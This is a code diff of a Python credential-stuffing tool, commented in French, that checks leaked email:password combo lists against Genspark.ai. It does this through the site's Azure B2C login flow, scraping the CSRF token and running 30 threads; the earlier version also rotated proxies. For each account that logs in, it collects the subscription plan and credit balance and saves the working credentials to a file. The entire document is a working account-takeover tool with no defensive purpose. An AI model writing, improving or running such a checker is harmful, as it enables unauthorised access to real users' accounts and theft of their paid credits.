@@ -1,256 +1,248 @@
 import requests
+import re
+import json
 import os
-import sys
-import time
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from threading import Lock
+import threading
+from queue import Queue
+from time import sleep
 
-# ──────────────────────────────────────────────
-#  COUNTERS
-# ──────────────────────────────────────────────
-lock       = Lock()
-checked    = 0
-valid      = 0
-invalid    = 0
-errors     = 0
+# --- VARIABLES DE CONFIGURATION ---
+NUM_THREADS = 30
+COMBO_FILE = "combo.txt"
+VALID_ACCOUNTS_FILE = "comptes_valides.txt"
+INVALID_ACCOUNTS_FILE = "comptes_invalides.txt"
 
-# ──────────────────────────────────────────────
-#  BANNER
-# ──────────────────────────────────────────────
-def clear():
-    os.system("cls" if os.name == "nt" else "clear")
+# --- Définition des couleurs pour le terminal ---
+class Colors:
+    GREEN = '\033[92m'
+    RED = '\033[91m'
+    YELLOW = '\033[93m'
+    CYAN = '\033[96m'
+    MAGENTA = '\033[95m'
+    RESET = '\033[0m'
 
-def banner():
-    clear()
-    print("\033[1;36m" + "═" * 62)
-    print("""
-   ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ██████╗ ██╗  ██╗
-  ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
-  ██║  ███╗█████╗  ██╔██╗ ██║███████╗██████╔╝███████║██████╔╝█████╔╝ 
-  ██║   ██║██╔══╝  ██║╚██╗██║╚════██║██╔═══╝ ██╔══██║██╔══██╗██╔═██╗ 
-  ╚██████╔╝███████╗██║ ╚████║███████║██║     ██║  ██║██║  ██║██║  ██╗
-   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
-    """)
-    print("\033[1;33m" + "  TOOL   : Genspark.ai Account Checker")
-    print("  TARGET : https://www.genspark.ai")
-    print("  CHECKS : Plan  |  Credits Balance")
-    print("  BY     : josefelka1")
-    print("\033[1;36m" + "═" * 62 + "\033[0m")
+# Lock pour synchroniser l'accès aux fichiers et aux compteurs
+file_lock = threading.Lock()
+combo_queue = Queue()
 
-# ──────────────────────────────────────────────
-#  STATUS LINE
-# ──────────────────────────────────────────────
-def update_title():
-    sys.stdout.write(
-        f"\r\033[1;37m Checked: \033[1;33m{checked}"
-        f"  \033[1;32mValid: {valid}"
-        f"  \033[1;31mInvalid: {invalid}"
-        f"  \033[1;35mErrors: {errors}   "
-    )
-    sys.stdout.flush()
+# --- Compteurs pour le suivi de la progression ---
+checked_count = 0
+valid_count = 0
+total_accounts = 0
 
-# ──────────────────────────────────────────────
-#  LOGIN  →  grab cookies/token
-# ──────────────────────────────────────────────
-LOGIN_URL   = "https://www.genspark.ai/api/auth/login"
+# --- URLs des APIs Genspark ---
 USER_URL    = "https://www.genspark.ai/api/user"
 BALANCE_URL = "https://www.genspark.ai/api/payment/get_credit_balance"
 
-HEADERS_BASE = {
-    "User-Agent"  : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                    "AppleWebKit/537.36 (KHTML, like Gecko) "
-                    "Chrome/124.0.0.0 Safari/537.36",
-    "Accept"      : "application/json, text/plain, */*",
-    "Content-Type": "application/json",
-    "Referer"     : "https://www.genspark.ai/",
-    "Origin"      : "https://www.genspark.ai",
-}
 
-def login(email: str, password: str, proxy: dict | None = None):
+def get_plan_and_balance(session):
     """
-    POST login → returns a requests.Session with auth cookies on success,
-    or None on failure.
+    Après une connexion réussie, appelle les deux APIs Genspark
+    pour récupérer le plan et le solde de crédits.
+    Retourne un dict: { 'plan': ..., 'interval': ..., 'balance': ... }
     """
-    session = requests.Session()
-    session.headers.update(HEADERS_BASE)
+    info = {'plan': 'N/A', 'interval': 'N/A', 'balance': 'N/A'}
 
-    payload = {"email": email, "password": password}
+    # --- 1. GET /api/user → plan + interval ---
     try:
-        r = session.post(
-            LOGIN_URL,
-            json=payload,
-            proxies=proxy,
-            timeout=15,
-            allow_redirects=True,
-        )
-        # Some implementations return 200 with a token in JSON
-        if r.status_code in (200, 201):
-            try:
-                data = r.json()
-                token = (
-                    data.get("token")
-                    or data.get("access_token")
-                    or data.get("data", {}).get("token")
-                )
-                if token:
-                    session.headers.update({"Authorization": f"Bearer {token}"})
-            except Exception:
-                pass
-            return session
-        return None
-    except Exception:
-        return None
-
-# ──────────────────────────────────────────────
-#  FETCH USER INFO
-# ──────────────────────────────────────────────
-def get_user_info(session: requests.Session, proxy: dict | None = None):
-    """GET /api/user  →  returns dict with plan fields or None."""
-    try:
-        r = session.get(USER_URL, proxies=proxy, timeout=15)
+        r = session.get(USER_URL, timeout=10)
         if r.status_code == 200:
-            return r.json()
+            data = r.json()
+            # Cherche dans la racine ou dans data{}
+            plan = (
+                data.get("personal_plan")
+                or data.get("data", {}).get("personal_plan")
+                or "N/A"
+            )
+            interval = (
+                data.get("personal_paid_sub_interval")
+                or data.get("data", {}).get("personal_paid_sub_interval")
+                or "N/A"
+            )
+            info['plan']     = plan
+            info['interval'] = interval
     except Exception:
         pass
-    return None
 
-# ──────────────────────────────────────────────
-#  FETCH CREDIT BALANCE
-# ──────────────────────────────────────────────
-def get_balance(session: requests.Session, proxy: dict | None = None):
-    """GET /api/payment/get_credit_balance  →  returns balance int or None."""
+    # --- 2. GET /api/payment/get_credit_balance → balance ---
     try:
-        r = session.get(BALANCE_URL, proxies=proxy, timeout=15)
+        r = session.get(BALANCE_URL, timeout=10)
         if r.status_code == 200:
             data = r.json()
             # {"status":0,"message":"success","data":{"balance":9717,...}}
-            return data.get("data", {}).get("balance")
+            balance = data.get("data", {}).get("balance")
+            if balance is not None:
+                info['balance'] = str(balance)
     except Exception:
         pass
-    return None
 
-# ──────────────────────────────────────────────
-#  CORE CHECK
-# ──────────────────────────────────────────────
-def check_account(combo: str, proxy_str: str | None, out_valid: str, out_invalid: str):
-    global checked, valid, invalid, errors
+    return info
 
-    combo = combo.strip()
-    if not combo or ":" not in combo:
-        return
 
-    email, _, password = combo.partition(":")
+def check_account(email, password):
+    """
+    Tente de se connecter via Azure B2C.
+    Si succès, récupère plan + balance depuis les APIs Genspark.
+    Retourne ('SUCCESS', session) ou ('CODE_ERREUR', None).
+    """
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+    })
 
-    proxy = None
-    if proxy_str:
-        proxy = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
+    try:
+        start_url = "https://login.genspark.ai/gensparkad.onmicrosoft.com/b2c_1_new_login/oauth2/v2.0/authorize?client_id=536a4e98-fd24-4cbc-a67b-417e209e0080&response_type=code&redirect_uri=https%3A%2F%2Fwww.genspark.ai%2Fapi%2Fauth&scope=email+offline_access+openid+profile&state=xpwmrIPnDhMBjJGO&code_challenge=fV3lU4JOuBYIqOZD-9fy0xvjjMvodCQG1IwZ1FrjFgo&code_challenge_method=S256&nonce=adb5015c40192345d6552754ba3a75adeefff70a6c9407554e91ee523d879d13&client_info=1&prompt=login"
+        response = session.get(start_url, timeout=10)
+        page_content = response.text
 
-    # ── 1. Login ──────────────────────────────
-    session = login(email, password, proxy)
-    with lock:
-        checked += 1
+        settings_match = re.search(r'var SETTINGS = ({.*?});', page_content, re.DOTALL)
+        if not settings_match:
+            return 'ERROR_SETTINGS', None
 
-    if session is None:
-        with lock:
-            invalid += 1
-        update_title()
-        with open(out_invalid, "a", encoding="utf-8") as f:
-            f.write(f"{combo}\n")
-        print(f"\n  \033[1;31m[✗] INVALID\033[0m  {email}")
-        return
+        settings_data = json.loads(settings_match.group(1))
+        csrf_token    = settings_data['csrf']
+        transaction_id = settings_data['transId']
 
-    # ── 2. Grab user info ─────────────────────
-    user_data = get_user_info(session, proxy)
+        login_post_url = "https://login.genspark.ai/gensparkad.onmicrosoft.com/B2C_1_new_login/SelfAsserted"
+        query_params = {'tx': transaction_id, 'p': 'B2C_1_new_login'}
+        payload = {'request_type': 'RESPONSE', 'email': email, 'password': password}
+        post_headers = {
+            'x-csrf-token': csrf_token,
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://login.genspark.ai',
+            'Referer': response.url,
+        }
 
-    plan          = "N/A"
-    interval      = "N/A"
-
-    if user_data:
-        # Try common key paths
-        plan     = (
-            user_data.get("personal_plan")
-            or user_data.get("data", {}).get("personal_plan")
-            or "N/A"
-        )
-        interval = (
-            user_data.get("personal_paid_sub_interval")
-            or user_data.get("data", {}).get("personal_paid_sub_interval")
-            or "N/A"
+        login_response = session.post(
+            login_post_url,
+            params=query_params,
+            headers=post_headers,
+            data=payload,
+            timeout=10
         )
 
-    # ── 3. Grab credit balance ────────────────
-    balance = get_balance(session, proxy)
-    balance_str = str(balance) if balance is not None else "N/A"
+        if login_response.status_code == 200:
+            data = login_response.json()
+            if data.get("status") == "200":
+                return 'SUCCESS', session          # session gardée avec les cookies
+            elif data.get("status") == "400":
+                message = data.get("message", "")
+                if "Your password is incorrect" in message:
+                    return 'WRONG_PASSWORD', None
+                if "We can't seem to find your account" in message:
+                    return 'ACCOUNT_NOT_FOUND', None
+                return 'ERROR_API', None
 
-    # ── 4. Output ─────────────────────────────
-    with lock:
-        valid += 1
-    update_title()
+        return 'ERROR_UNEXPECTED_RESPONSE', None
 
-    result_line = (
-        f"{combo} | Plan: {plan} | Interval: {interval} | Balance: {balance_str}"
-    )
+    except (requests.exceptions.RequestException, json.JSONDecodeError, KeyError):
+        return 'ERROR_NETWORK_OR_PARSE', None
 
-    with open(out_valid, "a", encoding="utf-8") as f:
-        f.write(result_line + "\n")
 
-    plan_color = "\033[1;32m" if plan in ("plus", "pro") else "\033[1;33m"
-    print(
-        f"\n  \033[1;32m[✓] VALID\033[0m  {email}"
-        f"  {plan_color}[{plan.upper()}]\033[0m"
-        f"  \033[1;36mInterval: {interval}\033[0m"
-        f"  \033[1;35mBalance: {balance_str} credits\033[0m"
-    )
+def worker():
+    """Vérifie un compte, récupère plan + balance si valide, affiche le statut."""
+    global checked_count, valid_count, total_accounts
 
-# ──────────────────────────────────────────────
-#  MAIN
-# ──────────────────────────────────────────────
-def main():
-    banner()
+    while not combo_queue.empty():
+        line = combo_queue.get_nowait()
+        line = line.strip()
+        if not line or ':' not in line:
+            combo_queue.task_done()
+            continue
 
-    combo_file   = input("\033[1;32m  Combo file (email:pass)  : \033[1;33m").strip()
-    out_valid    = input("\033[1;32m  Output VALID file        : \033[1;33m").strip()
-    out_invalid  = input("\033[1;32m  Output INVALID file      : \033[1;33m").strip()
-    proxy_file   = input("\033[1;32m  Proxy file (leave blank) : \033[1;33m").strip()
-    threads_in   = input("\033[1;32m  Threads                  : \033[1;33m").strip()
-    print("\033[0m")
+        email, password = line.split(':', 1)
 
-    threads = int(threads_in) if threads_in.isdigit() else 10
+        result_code, session = check_account(email, password)
 
-    # Load combos
-    if not os.path.isfile(combo_file):
-        print(f"\033[1;31m  [!] Combo file not found: {combo_file}")
-        sys.exit(1)
-    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
-        combos = [l.strip() for l in f if l.strip() and ":" in l]
+        with file_lock:
+            checked_count += 1
 
-    # Load proxies
-    proxies_list = [None]
-    if proxy_file and os.path.isfile(proxy_file):
-        with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
-            proxies_list = [l.strip() for l in f if l.strip()] or [None]
+            if result_code == 'SUCCESS':
+                valid_count += 1
 
-    print(f"\033[1;36m  Loaded {len(combos)} combos | {len(proxies_list)} proxies | {threads} threads\033[0m\n")
-    time.sleep(1)
+                # --- Récupération du plan et du solde ---
+                info = get_plan_and_balance(session)
 
-    proxy_index = 0
+                plan     = info['plan']
+                interval = info['interval']
+                balance  = info['balance']
 
-    def task(combo):
-        nonlocal proxy_index
-        with lock:
-            px = proxies_list[proxy_index % len(proxies_list)]
-            proxy_index += 1
-        check_account(combo, px, out_valid, out_invalid)
+                # Ligne sauvegardée dans le fichier valide
+                save_line = (
+                    f"{line} | "
+                    f"Plan: {plan} | "
+                    f"Interval: {interval} | "
+                    f"Balance: {balance}"
+                )
+                with open(VALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f_out:
+                    f_out.write(save_line + "\n")
 
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = [executor.submit(task, c) for c in combos]
-        for _ in as_completed(futures):
-            pass
+                # Couleur selon le plan
+                if plan in ('pro',):
+                    plan_color = Colors.MAGENTA
+                elif plan in ('plus',):
+                    plan_color = Colors.GREEN
+                else:
+                    plan_color = Colors.YELLOW
 
-    print(f"\n\n\033[1;36m{'═'*62}")
-    print(f"  Done!  Valid: \033[1;32m{valid}\033[1;36m  |  Invalid: \033[1;31m{invalid}\033[1;36m  |  Errors: \033[1;35m{errors}")
-    print(f"  Results saved to: \033[1;33m{out_valid}\033[0m")
-    input("\n  Press ENTER to exit...")
+                message = (
+                    f"{Colors.GREEN}Compte Valide{Colors.RESET} | "
+                    f"Plan: {plan_color}{plan.upper()}{Colors.RESET} | "
+                    f"Interval: {Colors.CYAN}{interval}{Colors.RESET} | "
+                    f"Balance: {Colors.CYAN}{balance} credits{Colors.RESET}"
+                )
 
+            else:
+                if result_code == 'WRONG_PASSWORD':
+                    error_msg = "Mot de passe incorrect"
+                elif result_code == 'ACCOUNT_NOT_FOUND':
+                    error_msg = "Compte introuvable"
+                else:
+                    error_msg = f"Erreur ({result_code})"
+
+                message = f"{Colors.RED}{error_msg}{Colors.RESET}"
+                with open(INVALID_ACCOUNTS_FILE, 'a', encoding='utf-8') as f_out:
+                    f_out.write(line + "\n")
+
+            # Ligne de statut
+            status_line = f"[{checked_count}/{total_accounts}] [Valides: {valid_count}]"
+            print(f"{status_line} {line}  ->  {message}")
+
+        combo_queue.task_done()
+
+
+# --- Point d'entrée principal du script ---
 if __name__ == "__main__":
-    main()
+    if not os.path.exists(COMBO_FILE):
+        print(f"{Colors.RED}ERREUR : Le fichier '{COMBO_FILE}' est introuvable.{Colors.RESET}")
+        exit()
+
+    open(VALID_ACCOUNTS_FILE, 'w').close()
+    open(INVALID_ACCOUNTS_FILE, 'w').close()
+
+    with open(COMBO_FILE, 'r', encoding='utf-8') as f:
+        lines = [line.strip() for line in f if ':' in line.strip()]
+        for line in lines:
+            combo_queue.put(line)
+
+    total_accounts = len(lines)
+
+    if total_accounts == 0:
+        print(f"{Colors.YELLOW}Le fichier '{COMBO_FILE}' est vide ou mal formaté.{Colors.RESET}")
+        exit()
+
+    print(f"--- Lancement de la vérification de {total_accounts} comptes avec {NUM_THREADS} threads ---")
+
+    threads = []
+    for _ in range(NUM_THREADS):
+        thread = threading.Thread(target=worker, daemon=True)
+        thread.start()
+        threads.append(thread)
+
+    combo_queue.join()  # Attendre que tous les éléments de la file soient traités
+
+    print(f"\n--- Vérification terminée ---")
+    invalid_count = total_accounts - valid_count
+    print(f"Résultats: {valid_count} valides, {invalid_count} invalides sur {total_accounts} comptes vérifiés.")
+    print(f"{Colors.GREEN}Les comptes valides ont été sauvegardés dans '{VALID_ACCOUNTS_FILE}'.{Colors.RESET}")
+    print(f"{Colors.RED}Les comptes invalides ont été sauvegardés dans '{INVALID_ACCOUNTS_FILE}'.{Colors.RESET}")
